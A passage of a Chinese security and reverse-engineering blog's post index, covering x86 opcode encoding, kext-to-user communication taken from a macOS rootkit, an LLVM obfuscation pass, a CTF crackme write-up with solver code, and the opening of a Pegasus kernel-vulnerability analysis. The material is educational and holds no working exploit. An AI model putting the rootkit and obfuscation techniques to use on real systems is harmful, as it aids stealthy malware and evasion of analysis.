prefix 不会与 66H prefix 产生冲突，最终的作用于 66H prefix，因此 operand size 是 16 位的。 opcode整个编码中opcode是必须的，因为代表着这条指令的含义，整个指令的核心，且prefix与Opcode共享00~FF的空间。 一个opcode可以由一个byte组成，我们称之为1-byte opcode，当然，与之对应的，就有2-bytes opcode和3-bytes opcode。其中，后两者一般会有一个被称为escape opcode的byte进行引导，该byte的数值是0FH。所以，一般情况下，2-bytes opcode就是0FH后面再加一个byte，而3-bytes opcode就是0FH后面再加两个bytes。 ModR/MModRM在指令中非常重要，是理解x86平台opcode的关键，决定着寻址模式。 由一个byte组成，其格式如下： 7 6 5 4 3 2 1 0 mod reg R/M 1、mod：寻址模式。 2位组成4种寻址模式，总的来说，只有两种寻址模式，就是：内存寻址模式和寄存器寻址模式。 mod = 11指出寄存器寻址模式，mod = 00 ~ 10 时指出内存寻址模式： mod = 00，定义 [register] 间接寻址，无displacement值。 mod = 01，定义 [register + disp8]，有8位displacemnet 偏移值。 mod = 10，定义 [register + disp32]，有32位displacement偏移值。 2、reg：寄存器ID值 3位组成8个寄存器ID值，从 000 ~ 111，对应于 RAX、RCX、RDX、RBX、RSP、RBP、RSI以及RDI。这个ID值可以被REX prefix扩充为4位，范围从 0000 ~ 1111可表示16个寄存器。 reg域的另一含义是对Opcode的补充，对分为一组Opcode的进行选择（Group属性）。 3、r/m：意即register / memory。 ​ 提供对registers或memory的寻址，也用来表示寄存器ID，当是registers时是寄存器ID值。当是memory时是寄存器间接寻址中的寄存器ID值。当mod != 11 时，r/m 表示 [rax] ~ [rdi]，REX prefix用来扩充寄存器ID值。 注意: (1) 如果像这条指令：mov eax, [eax+ecx2+0x0c] 在这条指令里eax是base寄存器，ecx是Index寄存器，2是scale，还有一个displacement ,这种内存寻址是base+indexscale+disp。这需要SIB字节来进行确定，那么ModRM必须要有一个手段来引出后续的SIB字节。在 [rax] ~ [rdi] 的范围里，Intel选择了原来应属于 [rsp] 的值用来引出SIB，一是因为 [rsp] 并不常用吧。二是因为 rsp 设计为 stack top指针，专用于stack top指针。 原来属于 [rsp] 的领域对应的，r/m是100，这个领域被 [SIB] 替代了，事实上在16位机器原本是没有SIB字节的，base+index*scale+disp这种寻址是后来才增加的。16位的ModRM上是没有SIB引导域。 (2)如果内存寻址中没有base和index，只有disp的话，如：mov ebx, [0x11223344]，这种直接寻址方式，在设计上ModRM还必须为提供这个模式。 Intel又作出修改，选择了原来属于 [rbp] 模式的领域提供给 [disp]，选择 [rbp] 让给 [disp]，是因为 rbp 原本意图就是设计为 stack基址指针。[rbp] 寻址一般都要加上一个偏移量，也就是基于stack frame指针的偏移量，即 [ebp + disp] 这种寻址模式在 mod = 01 或 mod = 10 中给出。 SIBSIB意即：Scale – Index – Base，用来定义base+index*scale+disp这种寻址模式。同样按2-3-3比例组合。 7-6 5-4-3 2-1-0 scale index base index 域指出index寄存器的ID值，范围从 000 ~ 111。base 域指出base寄存器的ID 值，从 000 ~ 111。Index与base经过 REX prefix可以扩展为0000 ~ 1111。 Displacement 和 Immediate某些指令会在最后要求有一个用于计算内存地址的值，或者一个立即数。很明显，不多说。 综合起来，看下面的例子： 49 8b 7d 00 49=0100 1001对应REX prefix,默认64为size模式 8b= mov opcode 7d=01 111 101—&gt;ModR/M mod = 01，定义 [register + disp8]，有8位displacemnet 偏移值。rdi ,r13 00=Displacement = 0 所以指令= mov rdi,QWORD PTR [r13+0]—&gt;mov rdi,[r13] ​ 参考及索引http://ref.x86asm.net/coder32.html —-&gt; 查阅opcode http://pnx.tf/files/x86_opcode_structure_and_instruction_overview.png —&gt;quick look Intel x86 Assembler Instruction Set Opcode Table http://www.mouseos.com/x64/index.html https://bbs.pediy.com/thread-78121.htm X86指令编码的那些事儿 http://subler.github.io/note/compiler/x86_instruction_encode.html onlineDisassembler","tags":[{"name":"x86","slug":"x86","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/x86/"}]},{"title":"一种用户层与kext内核扩展交互方式","date":"2017-08-10T07:59:00.000Z","path":"2017/08/10/一种用户层与kext内核扩展交互方式/一种用户层与kext内核扩展交互方式/","text":"最近在学习一个Mac平台上开源的rootKit框架，里面确实有很多干货，本文就来分析其中与用户层交互的部分。简单说下rootKit原理：利用kext驻留在内核，完成实际的各种功能：sys_ptrace过滤 PT_DENY_ATTACH反调试hook系统调用防止sys_kil（很强大有木有）隐藏自身进程，文件监控，网络监控，提权等等可谓是相当可怕。这些功能都可以通过一个用户进程来控制，所以这里必须有一种机制来提供kext与用户层的交互方式，这就是本文重点。 0x01 一个例子进入kext开发在这之前，简单的用一个例子来学习下kext开发。下面关于xcode中的操作都很明显，故忽略。 打开xcode创建一个Generic Kernel Extension工程，完成之后会出现一个kext模板，如下 #include &lt;mach/mach_types.h&gt; #include &lt;libkern/libkern.h&gt; kern_return_t TestExtension_stop(kmod_info_t *ki, void *d); kern_return_t TestExtension_start(kmod_info_t * ki, void *d) { printf(&quot;hello kext!\\n&quot;); return KERN_SUCCESS; } kern_return_t TestExtension_stop(kmod_info_t *ki, void *d) { printf(&quot;bye kext!\\n&quot;); return KERN_SUCCESS; } 其中这两个函数分别在内核扩展加载和卸载时调用，比如上面我们只是打印一行hello kext，这句话就会在这个kext加载是打印出来（在系统日志中查看）你可能会有疑惑，系统如何知道是这两个函数的，这个是在工程中设置的，你可以改变成任何函数都是OK的。 简单编译一下，然后找到编译后的kext文件，输入命令改变权限 sudo chown -R root:wheel TestExtension.kext 再输入 sudo kextload TestExtension.kext 加载内核扩展，如果一切没错的话，这时你在系统日志中就会出现hello kext这句话。同理你可以输入下面的命令 sudo kextunload TestExtension.kext 来卸载该内核扩展，你同样会看到bye kext这句话。 0x02 用户层与内和扩展间的交互下面要介绍的是一种类似于socket机制的交互机制，通常kext在加载的时候会建立一个socket服务器，然后用户层程序去打开这个socket（使用PF_SYSTEM协议）。接下来kext就会处理来至用户端的命令。下面同样通过一个例子来表明他们之间的交互，这里分为kext和客户端两部分。 kext 示例代码#include &lt;sys/systm.h&gt; #include &lt;mach/mach_types.h&gt; #include &lt;mach/kern_return.h&gt; #include &lt;sys/kern_control.h&gt; //#include &lt;SOMEWHERE YOU CAN GET STRNCPY IN THE KERNEL FROM&gt; char name[] = &quot;com.example.mymodule&quot; ;//标识这个kext struct kern_ctl_ref _ctlref ; kern_return_t start(kmod_info_t *info, void *data) { int err ; struct kern_ctl_reg ctlreg ; bzero(&amp;ctlreg, sizeof(ctlreg)) ; //控制信息 ctlreg.ctl_id = 0 ; /* 请求分配一个动态id */ ctlreg.ctl_unit = 0 ; strncpy(ctlreg.ctl_name, name, sizeof(ctlreg.ctl_name)); //回调函数 ctlreg.ctl_connect_func = connect ; ctlreg.ctl_disconnect_func = disconnect ; ctlreg.ctl_send_func = send ; ctlreg.ctl_getopt_func = getopt ; ctlreg.ctl_setopt_func = setopt ; //注册内核控制 err = ctl_register(&amp;ctlreg, &amp;_ctlref) ; if (err) return KERN_FAILURE ; return KERN_SUCCESS ; } 下面解释下其中的kern_ctl_ref数据结构 struct kern_ctl_reg { /* 控制信息 */ char ctl_name[MAX_KCTL_NAME]; u_int32_t ctl_id; u_int32_t ctl_unit; /* 控制设置 */ u_int32_t ctl_flags; u_int32_t ctl_sendsize; u_int32_t ctl_recvsize; /* 回调函数 */ ctl_connect_func ctl_connect;//建立连接时调用 ctl_disconnect_func ctl_disconnect;//断开连接时调用 ctl_send_func ctl_send;//处理从client到kernel的数据发送 ctl_setopt_func ctl_setopt; //当client调用setsockopt时调用 ctl_getopt_func ctl_getopt;//当client调用getsockopt时调用 }; client 示例代码#include &lt;socket.h&gt; #include &lt;string.h&gt; #include &lt;sys/kern_control.h&gt; #include &lt;sys/ioctl.h&gt; char name[] = &quot;com.example.mymodule&quot; ;//标识这个kext static int g_socket = -1; u_int32_t getctlidbybame(int sock, char *name) ; //建立连接 int socket_ctl(char *name) { int g_sock = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL) ; if (g_sock == 0) return 0 ; u_int32_t id = getctlidbyname(g_sock, name) ; sockaddr_ctl addr ; addr.sc_len = sizeof(addr) ; addr.sc_family = AF_SYSTEM ; addr.sc_sysaddr = AF_SYS_CONTROL ; addr.sc_id = id ; addr.sc_unit = 0 ; /* allocate dynamically */ int err ; err = connect(g_sock, (struct sockaddr*)&amp;addr, sizeof(addr)) ; if (err) return 0 ; return sock ; } u_int32_t getctlidbybame(int sock, char *name) { struct ctl_info info ; memset(&amp;info, 0, sizeof(info)) ; strncpy(info.ctl_name, name, strlen(name)) ; int err = ioctl(sock, CTLIOCGINGO, &amp;info) ; if (err) return 0 ; /* should do something stronger here! */ return info.ctl_id ; } int main(int argc, const char *argv[]) { socket_ctl(name); } //发送数据 void execute_cmd(int cmd, char *args) { char data[32] = { 0 }; size_t data_len = 0; int retv; if(args != NULL) { memcpy(data, args, strlen(args)); } data_len = strlen(data) + 1; retv = setsockopt(g_socket, SYSPROTO_CONTROL, cmd, (void *)data, (socklen_t)data_len); if(retv != 0) { printf(&quot;[ERROR] Kernel command execution failed:\\n&quot;); printf(&quot;\\t%s (%d)\\n&quot;, strerror(errno), errno); return; } } //接收数据 void get_data() { char *data = malloc(32); socklen_t data_len = 32; int retv = getsockopt(g_socket, SYSPROTO_CONTROL, 0, data, &amp;data_len); if(retv != 0) { printf(&quot;[ERROR] getsockopt()\\n&quot;); return; } size_t r = recv(g_socket, data, data_len, 0); if(r == 0) { printf(&quot;[ERROR] recv()\\n&quot;); return; } } 代码不是很复杂，先通过kext名去获取一个id建立一个socket，然后通过这个socket去发送和接受kext的数据。 0x03 总结在这个rootKit框架中还有很多可以挖掘的东西，里面hook系统调用来达到反kill等功能很是实用，以及一些内核操作手段都值得学习和借鉴，待续… 0x04 参考 http://www.tanhao.me/pieces/1515.html/ https://urchin.earth.li/~twic/Kernel_Extensions_for_OS_X.html https://github.com/enzolovesbacon/inficere","tags":[{"name":"kext","slug":"kext","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/kext/"}]},{"title":"初-LLVM的代码混淆","date":"2017-06-25T07:09:13.000Z","path":"2017/06/25/初-LLVM的代码混淆/初-LLVM的代码混淆/","text":"0x00 目录 断断续续的学习了一段时间的LLVM，记录下学习进度，随着后面的学习待更新 LLVM简介 一个基于LLVM简单的代码混淆例子 参考链接 0x01 LLVM简介LLVM(low level virtual machine)是一个先进的编译器框架，它提供了一种代码编写良好的中间表示(IR)，可以作为多种语言的后端，还可以提供与变成语言无关的优化和针对多种cpu的代码生成功能。LLVM的主要架构如下： 前端：前端用来获取源代码然后将它转变为某种中间表示，我们可以选择不同的编译器来作为LLVM的前端，如gcc，clang。 Pass：Pass是LLVM优化工作的一个节点，一个节点做些事，一起加起来就构成了LLVM完整的优化和转化。 后端：后端用来生成实际的机器码，一般情况下不会关注这一部分。 LLVM框架：这里与传统的编译器不同，LLVM采用了一种统一的中间表示： 安装与使用首先下载LLVM $ cd where-you-want-llvm-to-live $ svn co http://llvm.org/svn/llvm-project/llvm/trunk llvm 我们选择clang作为LLVM前端，然后下载clang $ cd where-you-want-llvm-to-live $ cd llvm/tools $ svn co http://llvm.org/svn/llvm-project/cfe/trunk clang 下载编译运行库 $ cd where-you-want-llvm-to-live $ cd llvm/projects $ svn co http://llvm.org/svn/llvm-project/compiler-rt/trunk compiler-rt 最后编译LLVM源码 $ mkdir build $ cd build $ cmake -DCMAKE_BUILD_TYPE:String=Release ../llvm/ $ make 编译时间可能有点长，编译完成之后进行安装 $sudo make install 接下来就是LLVM的使用，先创建一个hello.c源文件 #include &lt;stdio.h&gt; int main(){ printf(&quot;hello LLVM\\n&quot;); return 0; } 0x02 一个基于LLVM简单的代码混淆例子Pass是LLVM中一个很重要的部分，每个Pass都是做优化或者转换的工作，LLVM的优化和转换工作就是由很多个Pass一起完成的。我们通过继承指定的类以及实现相关的虚函数来实现具体的Pass，具体的类型主要有以下几种： ImmutablePass MoudlePass CallGraphSCCPass FuncationPass LoopPass RegionPass BasicBlockPass MachineFunctionPass 下面这个例子来介绍一下pass的编写并达到简单的混淆。从这里下载这个模板llvm-pass-skeleton 下面是完整代码： #include &quot;llvm/Pass.h&quot; #include &quot;llvm/IR/Function.h&quot; #include &quot;llvm/Support/raw_ostream.h&quot; #include &quot;llvm/IR/LegacyPassManager.h&quot; #include &quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot; #include &quot;llvm/IR/Intrinsics.h&quot; #include &quot;llvm/IR/Instructions.h&quot; using namespace llvm; namespace { struct SkeletonPass : public FunctionPass { static char ID; SkeletonPass() : FunctionPass(ID) {} // virtual bool runOnFunction(Function &amp;F) { // errs() &lt;&lt; &quot;I saw a function called &quot; &lt;&lt; F.getName() &lt;&lt; &quot;!\\n&quot;; // return false; // } bool runOnFunction(Function &amp;F) override { Function *tmp = &amp;F; // 遍历函数中的所有基本块 for (Function::iterator bb = tmp-&gt;begin(); bb != tmp-&gt;end(); ++bb) { // 遍历基本块中的每条指令 for (BasicBlock::iterator inst = bb-&gt;begin(); inst != bb-&gt;end(); ++inst) { // 是否是add指令 if (inst-&gt;isBinaryOp()) { if (inst-&gt;getOpcode() == Instruction::Add) { ob_add(cast&lt;BinaryOperator&gt;(inst)); } } } } return false; } // a+b === a-(-b) bool ob_add(BinaryOperator *bo) { BinaryOperator *op = NULL; if (bo-&gt;getOpcode() == Instruction::Add) { // 生成 (－b) op = BinaryOperator::CreateNeg(bo-&gt;getOperand(1), &quot;&quot;, bo); // 生成 a-(-b) op = BinaryOperator::Create(Instruction::Sub, bo-&gt;getOperand(0), op, &quot;&quot;, bo); op-&gt;setHasNoSignedWrap(bo-&gt;hasNoSignedWrap()); op-&gt;setHasNoUnsignedWrap(bo-&gt;hasNoUnsignedWrap()); } // 替换所有出现该指令的地方 bo-&gt;replaceAllUsesWith(op); } }; } char SkeletonPass::ID = 0; // Automatically enable the pass. // http://adriansampson.net/blog/clangpass.html static void registerSkeletonPass(const PassManagerBuilder &amp;, legacy::PassManagerBase &amp;PM) { PM.add(new SkeletonPass()); } static RegisterStandardPasses RegisterMyPass(PassManagerBuilder::EP_EarlyAsPossible, registerSkeletonPass); 通过继承FunctionPass重写虚函数runOnFunction来到达我们代码混淆的目的，再看关键的混淆部分，如下面注释那样，找到函数中的add指令，并将其改为sub指令。如a+b经过混淆为a-(-b) bool runOnFunction(Function &amp;F) override { Function *tmp = &amp;F; // 遍历函数中的所有基本块 for (Function::iterator bb = tmp-&gt;begin(); bb != tmp-&gt;end(); ++bb) { // 遍历基本块中的每条指令 for (BasicBlock::iterator inst = bb-&gt;begin(); inst != bb-&gt;end(); ++inst) { // 是否是add指令 if (inst-&gt;isBinaryOp()) { if (inst-&gt;getOpcode() == Instruction::Add) { ob_add(cast&lt;BinaryOperator&gt;(inst)); } } } } return false; } 代码很简单，这里就不多说。我们使用 $clang -Xclang -load -Xclang build/skeleton/libSkeletonPass.* something.c 来运行这个pass编译成目标可执行文件现在我们创建一个addTest.c文件来测试是否代码混淆 #include &lt;stdio.h&gt; int func(int a,int b) { return a + b; } int main() { int c; c = func(6,9); printf(&quot;%d\\n&quot;,c); return c; } 先按照一般的编译源代码，查看关键汇编代码：然后运行我们的pass进行编译很明显，汇编代码发生了改变，当然这里仅仅是一个简单的混淆，感兴趣的可以研究下obfuscator-llvm这个项目。 0x03 参考链接深入剖析 iOS 编译 Clang / LLVMhttp://zke1ev3n.me/2016/01/18/%E5%9F%BA%E4%BA%8ELLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/","tags":[{"name":"LLVM","slug":"LLVM","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLVM/"},{"name":"obfuscation","slug":"obfuscation","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/obfuscation/"}]},{"title":"pwnhub-CTF re150","date":"2017-05-28T01:16:13.000Z","path":"2017/05/28/pwnhub-CTF-re150/pwnhub-CTF-re150/","text":"0x00 写在前面第一次做pwnhub题，最近参加了几场ctf比赛，pwnhub的题还是比较有一定难度的，这里记录下其中的一道逆向题。题目在这里 0x01 简单分析拿到题目后试着在虚拟机里运行了一下，看下有什么提示 然后转去hopper搜下相关字符串，并没有发现error相关字符串，syclover也没有相关printf等函数输出，看来只能上gdb调试看看。 发现程序里面有多处花指令以及隐藏了程序入口。 由上图可以发现syclover直接由int 0x80系统调用中断输出到屏幕，下面是一个循环解密，后面可知解密的正是程序的入口。 由__libc_start_main函数可得第一个参数即为main函数地址这里作为对比，可以看下hopper中对0x8048320main函数的解析完全不知道是什么有木有？所以拿到题如果放到IDA之类的反汇编工具根本看不出什么线索 接下来所做的事就是获取输入的字符串然后进行加密，然后与程序里的字符串加密比较，具体看后面的代码。 0x02 修复程序根据上面的分析，我们将程序进行修复 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;fcntl.h&gt; #include &lt;unistd.h&gt; #include &lt;assert.h&gt; #include &lt;elf.h&gt; #define ENTRY 0x08048320 #define FILE_OFF 0x320 #define COUNT 0x432 int main(int argc,char *argv[]){ Elf32_Ehdr ehdr; unsigned char buf[COUNT] = {0}; assert(argc == 2); int fd = open(argv[1],O_RDWR);//打开文件 assert(fd&gt;0); assert(lseek(fd,0,SEEK_SET)!=-1);// 读取elf头 assert(read(fd,&amp;ehdr,sizeof(ehdr)) == sizeof(ehdr)); ehdr.e_entry = ENTRY;//修改入口地址 assert(lseek(fd,0,SEEK_SET)!=-1);//回写elf头 assert(write(fd,&amp;ehdr,sizeof(ehdr)) == sizeof(ehdr)); //解密 assert(lseek(fd,FILE_OFF,SEEK_SET)!=-1);//读取被加密的代码 assert(read(fd,buf,COUNT) == COUNT); int i = 0; while(i&lt;COUNT){ buf[i] = (buf[i]^66)&lt;&lt;5 | (buf[i]^66)&gt;&gt;3; i++; } assert(lseek(fd,FILE_OFF,SEEK_SET)!=-1);//写入正确代码 assert(write(fd,buf,COUNT) == COUNT); 0x03 分析算法计算flag#!/usr/bin/python # -*- coding: UTF-8 -*- from __future__ import print_function import sys def getflag(): print(&quot;[i]start to encrypt key&quot;) key = [0x73,0x8d,0xf2,0x4c,0xc7,0xd4,0x7b,0xf7,0x18,0x32,0x71,0x0d,0xcf,0xdc,0x67,0x4f,0x7f,0x0b,0x6d] encryptKey = [] print(&quot;encryptKey=[&quot;, end=&quot;&quot;) for idx in range(len(key)): encryptKey.append(key[idx] ^ 0x20) print(&quot;%x &quot; % encryptKey[idx], end=&quot;&quot;) print(&quot;]&quot;) flag = [] print(&quot;[i]find the flag&quot;) for i in range(len(encryptKey)): count = 0x00 while(count &lt;= 0x7f): one = count &gt;&gt; (((0 &gt;&gt; 0x1d) + i) &amp; 0x7 - (0 &gt;&gt; 0x1d)) two = count &lt;&lt; (0x8 - (((0 &gt;&gt; 0x1d) + i) &amp; 0x7 - (0 &gt;&gt; 0x1d))) if((((one | two) ^ i) &amp; 0xff) == encryptKey[i]): flag.append(count) break count = count + 1 print(&quot;flag = &quot;,end=&quot;&quot;) for i in range(len(flag)): print(&quot;%c&quot; % flag[i], end=&quot;&quot;) if __name__ == &#39;__main__&#39;: key = getflag() 最后运行程序得到flag [i]start to encrypt key encryptKey=[53 ad d2 6c e7 f4 5b d7 38 12 51 2d ef fc 47 6f 5f 2b 4d ] [i]find the flag flag = SYC{&gt;&gt;Wh06m1&gt;&gt;R0Ot} 测试：","tags":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CTF/"},{"name":"writeup","slug":"writeup","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/writeup/"}]},{"title":"一道高中数学题的思考？","date":"2017-05-04T12:37:59.000Z","path":"2017/05/04/math/math/","text":"0x00 写在前面 突然在邮件中收到Quora中这样一个问题”What does X equal in $\\sqrt{x+15} + \\sqrt{x} = 15$? “ 凭着曾经对数学的热爱，我点了进去。顺便学习了点知识。 0x01 你会怎么解决？不得不承认，这种题型在初高中时候还是蛮常见的，在我的脑海里，也别无他法，一步一步去根号解方程吧。但都知道，同时平方带来就是可能会升高次数，有时候拿到答案还是挺繁琐的，至少计算上来说是这样的。 0x02 方法1 平方法通常解决这个问题的方法是将方程的两边平方并简化，并保持平方，直到方程中没有平方根 $\\sqrt{x+15} + \\sqrt{x} = 15$ $(\\sqrt{x+15} + \\sqrt{x})^2 = 15^2$ $x+15 + 2\\sqrt{(x+15)x} + x = 225$ $2\\sqrt{(x+15)x} = 210 - 2x$ $\\sqrt{(x+15)x} = 105 - x$ $(\\sqrt{(x+15)x})^2 = (105 - x)^2$ $x^2 + 15x = 11025 - 210x +x^2$ $225x = 11025$ $ x = 49$思维过程很清楚，但明显计算上有点繁琐。 0x03 方法2 拼凑法不一定可靠，但一定最快。大多情况下，都是开方后是整数。所以每个完全平方数的序列（$1^22^23^3…6^27^28^2… =&gt; 1 4 9 16 25 36 49 64 …$） 哪两个数相差15呢？很明显64 - 49 = 15，也许你觉得这很不靠谱，其实至少对于开方是整数的结果来说是很快的，觉得慢主要是你还不熟练。因为并不是一个一个的去试验，因为相邻之差是递增且快。类似二叉树来查找会很快得出结果。 $\\sqrt{49 + 15} + \\sqrt{49} = 15$ $7 + 8 = 15$最快，但不一定可靠。 0x04 方法3 平方差法暂且称作平方差法吧，这个方法是我最推荐的，既快又准。原式：$\\sqrt{x+15} + \\sqrt{x} = 15$ (1) 设 $\\sqrt{x+15} - \\sqrt{x} = k$ 又 $(\\sqrt{x+15} - \\sqrt{x})(\\sqrt{x+15} + \\sqrt{x})= 15k$ 解得： $k = 1$ 所以 $\\sqrt{x+15} - \\sqrt{x} = 1$ （2） 然后（1）+ (2): $2\\sqrt{x+15} = 16$ 解得: $x = 49$ 多么棒的一个方法 I love it！ 0x05 我与数学从小数学就比语文好的我，数学确实给了我很多自信，想破头皮的去思考一个一个的题。一如既往的热爱，以致于高考只填了一个专业–数学。由于种种原因，没能选上，去来到了计算机相关的专业。计算机科学同样是一个迷人的世界，那种理解本质，控制计算机的运行是让人着迷的。在反馈上来说，计算机比做数学得到的反馈更真实，快速。做数学题的时候总是找不到方向，得到的反馈少且慢，容易让人沮丧，想必这也是大多人讨厌数学的原因之一吧。虽然现在更热爱计算机，但心底里仍然有一个数学的种子。以至于很多时候看到感兴趣的题也会拿上纸笔算一算，知乎上也关注了相关话题，还有一个自己特别骄傲的回答，关于高中数列的，具体情况移步高考数学数列放缩总结技巧有哪些？相信不管是现在还是将来，数学都是我最深处的支持。","tags":[{"name":"math","slug":"math","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/math/"}]},{"title":"Pegasus内核漏洞及PoC分析","date":"2017-05-01T06:52:45.000Z","path":"2017/05/01/Pegasus内核漏洞及PoC分析/Pegasus内核漏洞及PoC分析/","text":"0x00 写在前面 不知道为什么，刚开始就有很多话想说。因为看似是本文开始，实际却是连续几天几夜的分析的结束。本文将详细介绍iOS三叉戟漏洞，其影响涉及OS X 10.11.6和 iOS 9.3.4。这里为了方便以及简单，环境为OS X 关注iOS安全的技术人员都或多或少的了解这个漏洞，这里就不多说，可以参考下面的链接或者自行Google 1.iOS“远程越狱”间谍软件Pegasus技术分析 2.iOS三叉戟漏洞补丁分析、利用代码 公布（POC 3.Pegasus – 针对iOS设备的APT攻击分析 0x01 目录 OSUnserializeBinary概述 漏洞分析-CVE-2016-4655，CVE-2016-4656 漏洞利用-PoC分析 总结 0x02 OSUnserializeBinary概述 序列化与反序列化在软件开发的过程中，两个模块通信时就需要序列化与发序列化，常见的xml-&gt;JSON，对应的反序列化JOSN-&gt;xml。简单来说就是数据格式上的一种相互转化。在XNU内核也有一个实现，OSUnserializeXML(将xml格式转化为内核数据对象)和OSUnserializeBinary(将二进制格式转化为内核数据对象) OSUnserializeBinary的二进制格式OSUnserializeBinary这个函数将连续的二进制流分成uint32_t32字节来处理。所以32位的整数就有特殊含义来表示一些数据结构。如下 #define kOSSerializeBinarySignature &quot;\\323\\0\\0&quot; /* 0x000000d3 */ enum { kOSSerializeDictionary = 0x01000000U, kOSSerializeArray = 0x02000000U, kOSSerializeSet = 0x03000000U, kOSSerializeNumber = 0x04000000U, kOSSerializeSymbol = 0x08000000U, kOSSerializeString = 0x09000000U, kOSSerializeData = 0x0a000000U, kOSSerializeBoolean = 0x0b000000U, kOSSerializeObject = 0x0c000000U, kOSSerializeTypeMask = 0x7F000000U, kOSSerializeDataMask = 0x00FFFFFFU, kOSSerializeEndCollection = 0x80000000U, }; 这里的0x000000d3代表了这个数据流的签名即开始的32位必须为该整数值，下面有一个字典，数组，集合等集合类数据结构，也有数字，字符串等基本数据结构表示。kOSSerializeTypeMask和kOSSerializeDataMask分别为类型和数据大小掩码。kOSSerializeEndCollection代表当前集合(dic，array或set)是否结束。可以看到，31位表示当前集合是否结束，30-24位表示当前数据类型，23-0表示元素的长度。 当前集合是否结束 当前数据类型 当前元素长度 0 0000000 000000000000000000000000 例如下面的二进制数据 0x000000d3 0x81000000 0x09000004 0x41414141 0x8b000001 则对应： &lt;dict&gt; &lt;string&gt;AAAA&lt;/string&gt; //键key &lt;boolean&gt;1&lt;/boolean&gt; //值value &lt;/dict&gt; 这样的数据结构。对应过程也很简单，0x000000d3标志为合法的签名，0x81000000为dic类型且为最后一个元素，0x09000004为4字节大小的字符串，0x8b000001为bool型，所以只需用最后一位代表true或false OSUnserializeBinary()分析完整源代码见文末，下面将对其中几个重要的地方分别做分析说明 while (ok) { bufferPos += sizeof(*next); if (!(ok = (bufferPos &lt;= bufferSize))) break; key = *next++; len = (key &amp; kOSSerializeDataMask); wordLen = (len + 3) &gt;&gt; 2; end = (0 != (kOSSerializeEndCollecton &amp; key)); newCollect = isRef = false; o = 0; newDict = 0; newArray = 0; newSet = 0; switch (kOSSerializeTypeMask &amp; key) { case kOSSerializeDictionary: ... case kOSSerializeArray: ... case kOSSerializeSet: ... case kOSSerializeObject: ... case kOSSerializeNumber: ... case kOSSerializeSymbol: ... case kOSSerializeString: ... case kOSSerializeData: ... case kOSSerializeBoolean: ... default: break; } ... 进行一些初始化和检查后就进入while(ok)循环，并且是以32位的整数位单位遍历循环，读取当前的整数key，确定其长度len，当前集合31位是否设置end。并通过类型掩码kOSSerializeTypeMask确定其key的类型从而进入不同的case。例如我们看kOSSerializeDictionary例子 case kOSSerializeDictionary: o = newDict = OSDictionary::withCapacity(len); newCollect = (len != 0); break; o为指向当前反序列化对象的指针，在每种case中被指定 case kOSSerializeData: bufferPos += (wordLen * sizeof(uint32_t)); if (bufferPos &gt; bufferSize) break; o = OSData::withBytes(next, len); next += wordLen; break; 这里当遇到一个为kOSSerializeData类型时，根据其len找到其数据并将其存储在OSData数据结构中，并移动next。其他的case都做类似对应的处理。跳出switch if (!(ok = (o != 0))) break; 因为每一次循环都会进入case并将o设置为对应对象才合法，当等于0时就说明不合法，则退出。 if (!isRef) { setAtIndex(objs, objsIdx, o); if (!ok) break; objsIdx++; } 这里很重要将与后面的漏洞相关，首先判断isRef是否被设置。 case kOSSerializeObject: if (len &gt;= objsIdx) break; o = objsArray[len]; o-&gt;retain(); isRef = true; break; isRef只有当当前的类型为kOSSerializeObject即引用类型是才被设为true，这里引用的意思则表示当前指向dic中其他数据，其值为对应下标。回到前面那里，下面重点关注setAtIndex这个宏定义 #define setAtIndex(v, idx, o) \\ if (idx &gt;= v##Capacity) \\ { \\ uint32_t ncap = v##Capacity + 64; \\ typeof(v##Array) nbuf = (typeof(v##Array)) kalloc_container(ncap * sizeof(o)); \\ if (!nbuf) ok = false; \\ if (v##Array) \\ { \\ bcopy(v##Array, nbuf, v##Capacity * sizeof(o)); \\ kfree(v##Array, v##Capacity * sizeof(o)); \\ } \\ v##Array = nbuf; \\ v##Capacity = ncap; \\ } \\ if (ok) v##Array[idx] = o; 看着很复杂，但简单来说就是如果数组大小不够的话就增加大小，然后就将其之前的o指向的对象放到objs数组中对应的位置。 if (dict) { if (sym) { if (o != dict) ok = dict-&gt;setObject(sym, o, true); o-&gt;release(); sym-&gt;release(); sym = 0; } else { sym = OSDynamicCast(OSSymbol, o); if (!sym &amp;&amp; (str = OSDynamicCast(OSString, o))) { sym = (OSSymbol *) OSSymbol::withString(str); o-&gt;release(); o = 0; } ok = (sym != 0); } } else if (array) { ok = array-&gt;setObject(o); o-&gt;release(); } else if (set) { ok = set-&gt;setObject(o); o-&gt;release(); } else { assert(!parent); result = o; } 对解析出来的当前的集合做对应处理，比如这里的如果dic为真，因为dic字典数据结构需要key-&gt;value键值对的形式，所以先判断sym，若没设置，则代表当前o对象为key，则将其转化为OSSymbol类型，设置sym为true并将ofree，那么下一次的o代表的对象一定是值，然后就将sym和o以键值对的形式存储在dic字典中，如此交替。后面的代码对漏洞来说不是很重要了 if (newCollect) { if (!end) { stackIdx++; setAtIndex(stack, stackIdx, parent); if (!ok) break; } DEBG(&quot;++stack[%d] %p\\n&quot;, stackIdx, parent); parent = o; dict = newDict; array = newArray; set = newSet; end = false; } if (end) { if (!stackIdx) break; parent = stackArray[stackIdx]; DEBG(&quot;--stack[%d] %p\\n&quot;, stackIdx, parent); stackIdx--; set = 0; dict = 0; array = 0; if (!(dict = OSDynamicCast(OSDictionary, parent))) { if (!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent))); } } 简单来说就是判断是否有新集合，如有的话，就将其压入栈中，那么后面的元素都放到新集合中，当end时就将整个新集合放入之前的dic。 0x03 漏洞分析-CVE-2016-4655，CVE-2016-4656这里将介绍两个漏洞：1，CVE-2016-4655-infoleak漏洞；2，CVE-2016-4656-UAF漏洞 